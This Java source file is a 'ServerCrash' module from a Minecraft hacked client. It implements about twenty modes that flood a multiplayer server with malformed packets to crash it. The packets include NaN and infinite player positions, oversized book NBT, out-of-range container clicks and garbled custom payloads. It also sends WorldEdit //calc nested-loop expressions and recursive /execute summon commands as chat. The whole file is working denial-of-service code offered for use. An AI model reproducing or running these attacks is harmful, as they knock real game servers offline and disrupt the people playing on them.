package Method.Client.module.misc;

import Method.Client.Main;
import Method.Client.managers.Setting;
import Method.Client.module.Category;
import Method.Client.module.Module;
import Method.Client.utils.TimerUtils;
import Method.Client.utils.system.Connection;
import Method.Client.utils.system.Wrapper;
import Method.Client.utils.visual.ChatUtils;
import io.netty.buffer.Unpooled;
import java.util.Random;
import net.minecraft.entity.Entity;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.login.client.CPacketEncryptionResponse;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCloseWindow;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.play.client.CPacketHeldItemChange;
import net.minecraft.network.play.client.CPacketKeepAlive;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.client.CPacketVehicleMove;
import net.minecraft.network.status.client.CPacketServerQuery;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.RandomUtils;

public class ServerCrash extends Module {
  Setting mode;
  
  Setting Packets;
  
  Setting AutoDisable;
  
  Setting JustOnce;
  
  public static boolean isModeMCBrandModifier;
  
  public static boolean disableSafeGuard;
  
  public long longdong;
  
  TimerUtils timer;
  
  public ServerCrash() {
    super("ServerCrash", 0, Category.MISC, "Server Crash");
    this.mode = Main.setmgr.add(new Setting("Mode", this, "Velt", new String[] { 
            "Velt", "Infinity", "Artemis.ac", "Artemis.ac2", "LiquidBounce-BookFlood", "Operator", "WorldEdit", "WorldEdit2", "TabComplete", "ItemSwitcher", 
            "KeepAlives", "Animation", "Payload", "NewFunction", "Hand", "Swap", "Riding", "Container", "Tp" }));
    this.Packets = Main.setmgr.add(new Setting("Packets", this, 5000.0D, 1.0D, 10000.0D, true));
    this.AutoDisable = Main.setmgr.add(new Setting("AutoDisable", this, false));
    this.JustOnce = Main.setmgr.add(new Setting("JustOnce", this, true));
    this.longdong = 0L;
    this.timer = new TimerUtils();
  }
  
  public void onDisable() {
    disableSafeGuard = false;
    isModeMCBrandModifier = false;
    this.longdong = 15000L;
  }
  
  public void onEnable() {
    ChatUtils.warning("This May - Will Crash You!");
    if (this.mode.getValString().equalsIgnoreCase("Payload")) {
      PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
      packetbuffer.writeLong(Long.MAX_VALUE);
      for (int i = 0; i < this.Packets.getValDouble(); i++)
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|AdvCdm", packetbuffer)); 
    } 
    if (this.mode.getValString().equalsIgnoreCase("Artemis.ac")) {
      for (int i = 0; i < this.Packets.getValDouble(); i++)
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketKeepAlive(0L)); 
    } else if (this.mode.getValString().equalsIgnoreCase("Artemis.ac2")) {
      mc.player.setPositionAndUpdate(mc.player.posX, Double.NaN, mc.player.posZ);
    } 
    this.longdong = 15000L;
  }
  
  public void onClientTick(TickEvent.ClientTickEvent event) {
    disableSafeGuard = true;
    new PacketBuffer(Unpooled.buffer().writeByte(2147483647));
    if (this.mode.getValString().equalsIgnoreCase("Container"))
      for (int i = 0; i < this.Packets.getValDouble(); i++) {
        mc.player.connection.sendPacket((Packet)new CPacketClickWindow(-2147483648, -2147483648, -2147483648, ClickType.CLONE, null, (short)1));
        mc.player.connection.sendPacket((Packet)new CPacketClickWindow(2147483647, 2147483647, 1, ClickType.CLONE, ItemStack.EMPTY, (short)1));
        mc.player.connection.sendPacket((Packet)new CPacketCloseWindow(-2147483648));
        mc.player.connection.sendPacket((Packet)new CPacketCloseWindow(2147483647));
      }  
    if (this.mode.getValString().equalsIgnoreCase("Tp")) {
      Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
      double y = 0.0D;
      double z = 0.0D;
      for (int e = 0; e < this.Packets.getValDouble(); ) {
        y = (e * 9);
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(mc.player.posX, mc.player.posY + y, mc.player.posZ, (new Random()).nextBoolean()));
        e++;
      } 
      for (int bb = 0; bb < this.Packets.getValDouble() * 10.0D; ) {
        z = (bb * 9);
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(mc.player.posX, mc.player.posY + y, mc.player.posZ + z, (new Random()).nextBoolean()));
        bb++;
      } 
    } 
    if (this.mode.getValString().equalsIgnoreCase("Hand"))
      for (int i = 0; i < this.Packets.getValDouble(); i++)
        mc.player.connection.sendPacket((Packet)new CPacketAnimation(EnumHand.MAIN_HAND));  
    if (this.mode.getValString().equalsIgnoreCase("Swap"))
      for (int i = 0; i < this.Packets.getValDouble(); i++)
        mc.player.connection.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, mc.player.getHorizontalFacing()));  
    if (this.mode.getValString().equalsIgnoreCase("Riding"))
      for (int i = 0; i < this.Packets.getValDouble(); i++) {
        Entity riding = mc.player.getRidingEntity();
        if (riding != null) {
          riding.posX = mc.player.posX;
          riding.posY = mc.player.posY + 1337.0D;
          riding.posZ = mc.player.posZ;
          mc.player.connection.sendPacket((Packet)new CPacketVehicleMove(riding));
        } 
      }  
    if (this.mode.getValString().equalsIgnoreCase("Artemis.ac2")) {
      for (int i = 0; i < this.Packets.getValDouble(); i++)
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.PositionRotation(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, (new Random()).nextBoolean())); 
    } else if (this.mode.getValString().equalsIgnoreCase("Artemis.ac")) {
      for (int i = 0; i < this.Packets.getValDouble(); i++)
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketKeepAlive(0L)); 
    } else if (this.mode.getValString().equalsIgnoreCase("NewFunction")) {
      for (int i = 0; i < this.Packets.getValDouble(); i++) {
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketEncryptionResponse());
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketServerQuery());
      } 
    } else if (this.mode.getValString().equalsIgnoreCase("Infinity")) {
      Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, (new Random()).nextBoolean()));
      Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, (new Random()).nextBoolean()));
    } else if (this.mode.getValString().equalsIgnoreCase("Velt")) {
      if (mc.player.ticksExisted < 100)
        for (int i = 0; i < this.Packets.getValDouble(); i++) {
          Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(mc.player.posX, mc.player.posY - 1.0D, mc.player.posZ, false));
          Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(mc.player.posX, Double.MAX_VALUE, mc.player.posZ, false));
          Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(mc.player.posX, mc.player.posY - 1.0D, mc.player.posZ, false));
        }  
    } else if (this.mode.getValString().equalsIgnoreCase("LiquidBounce-BookFlood")) {
      String randomString = RandomStringUtils.random(8, "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ");
      ItemStack bookStack = new ItemStack(Items.WRITABLE_BOOK);
      NBTTagCompound bookCompound = new NBTTagCompound();
      bookCompound.setString("author", "FileExtension");
      bookCompound.setString("title", "Â§8Â§l[Â§dÂ§lServerCrasherÂ§8Â§l]");
      NBTTagList pageList = new NBTTagList();
      int packets;
      for (packets = 0; packets < 50; packets++)
        pageList.appendTag((NBTBase)new NBTTagString(randomString)); 
      bookCompound.setTag("pages", (NBTBase)pageList);
      bookStack.setTagCompound(bookCompound);
      for (packets = 0; packets < this.Packets.getValDouble(); packets++) {
        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStack(bookStack);
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload((new Random()).nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
      } 
    } 
    if (this.mode.getValString().equalsIgnoreCase("FlexAir")) {
      for (int i = 0; i < this.Packets.getValDouble(); i++) {
        double rand1 = RandomUtils.nextDouble(0.1D, 1.9D);
        double rand2 = RandomUtils.nextDouble(0.1D, 1.9D);
        double rand3 = RandomUtils.nextDouble(0.1D, 1.9D);
        int rand4 = RandomUtils.nextInt(0, 2147483647);
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.PositionRotation(mc.player.posX + 1257892.0D * rand1, mc.player.posY + 9871521.0D * rand2, mc.player.posZ + 9081259.0D * rand3, mc.player.rotationYaw, mc.player.rotationPitch, (new Random()).nextBoolean()));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.PositionRotation(mc.player.posX - 9125152.0D * rand1, mc.player.posY - 1287664.0D * rand2, mc.player.posZ - 4582135.0D * rand3, mc.player.rotationYaw, mc.player.rotationPitch, (new Random()).nextBoolean()));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketKeepAlive(rand4));
      } 
    } else if (this.mode.getValString().equalsIgnoreCase("TabComplete")) {
      for (int i = 0; i < this.Packets.getValDouble(); i++) {
        double rand1 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
        double rand2 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
        double rand3 = RandomUtils.nextDouble(0.0D, Double.MAX_VALUE);
        ChatUtils.error("This feature is temporarily disabled");
      } 
    } else if (this.mode.getValString().equalsIgnoreCase("WorldEdit")) {
      if (mc.player.ticksExisted % 2 == 0) {
        mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
        mc.player.sendChatMessage("//calculate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
        mc.player.sendChatMessage("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
        mc.player.sendChatMessage("//evaluate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
        mc.player.sendChatMessage("//eval for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
      } 
    } else if (this.mode.getValString().equalsIgnoreCase("DEV")) {
      for (int i = 0; i < this.Packets.getValDouble(); i++) {
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|Brand", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|BOpen", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|TrList", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|TrSel", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|BEdit", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
        Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", (new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256))).writeString("Ă�â€“Ă�Ć’Ă�ďż˝Ă�ďż˝?Ă‚Â˝Ă‚ÂĽuĂ‚Â§}e>?\"Ă�Â¨Ă�Â«Ă�Â˝Ă�ÂĽĂ�ÂąĂ�ÂµĂ�Â·Ă�ÂĄĂ�Â˘Ă�ďż˝Ă…ÂľĂ…Â¸Ă†â€™Ă�Ĺľ")));
      } 
    } else if (this.mode.getValString().equalsIgnoreCase("Operator")) {
      for (int i = 0; i < this.Packets.getValDouble(); i++)
        mc.player.sendChatMessage("/execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ summon Villager"); 
    } else if (this.mode.getValString().equalsIgnoreCase("MC|BrandModifier")) {
      isModeMCBrandModifier = true;
    } else if (!this.mode.getValString().equalsIgnoreCase("ItemSwitcher")) {
      if (this.mode.getValString().equalsIgnoreCase("KitmapSignInteract")) {
        for (int i = 0; i < this.Packets.getValDouble(); i++) {
          mc.rightClickMouse();
          Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.DROP_ALL_ITEMS, new BlockPos(mc.player.posX, mc.player.posY, mc.player.posZ), EnumFacing.UP));
        } 
      } else if (this.mode.getValString().equalsIgnoreCase("WorldEdit2")) {
        for (int i = 0; i < this.Packets.getValDouble(); i++)
          Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("WECUI", (new PacketBuffer(Unpooled.buffer())).writeString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"))); 
      } else if (this.mode.getValString().equalsIgnoreCase("KeepAlives")) {
        for (int i = 0; i < this.Packets.getValDouble(); i++) {
          int r = RandomUtils.nextInt(0, 0);
          Wrapper.INSTANCE.sendPacket((Packet)new CPacketKeepAlive(r));
        } 
      } else if (this.mode.getValString().equalsIgnoreCase("Animation")) {
        for (int i = 0; i < this.Packets.getValDouble(); i++)
          mc.player.connection.sendPacket((Packet)new CPacketAnimation()); 
      } 
    } else {
      for (int i = 0; i < this.Packets.getValDouble(); i++) {
        for (int r = 0; r < 8; r++)
          Wrapper.INSTANCE.sendPacket((Packet)new CPacketHeldItemChange(r)); 
      } 
    } 
    if (this.timer.hasReached((float)this.longdong) && this.AutoDisable.getValBoolean()) {
      setToggled(false);
      this.timer.reset();
    } 
    if (this.JustOnce.getValBoolean() && !this.mode.getValString().equalsIgnoreCase("MC|BrandModifier"))
      setToggled(false); 
  }
  
  public boolean onPacket(Object packet, Connection.Side side) {
    if (this.mode.getValString().equalsIgnoreCase("MC|BrandModifier") && 
      packet instanceof CPacketCustomPayload) {
      CPacketCustomPayload C17 = (CPacketCustomPayload)packet;
      C17.channel = "MC|Brand";
      C17.data = (new PacketBuffer(Unpooled.buffer())).writeString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
    } 
    if (this.timer.hasReached((float)this.longdong) && this.AutoDisable.getValBoolean()) {
      if (packet instanceof net.minecraft.network.play.server.SPacketJoinGame)
        setToggled(false); 
      if (packet instanceof net.minecraft.network.play.server.SPacketDisconnect)
        setToggled(false); 
    } 
    return true;
  }
}
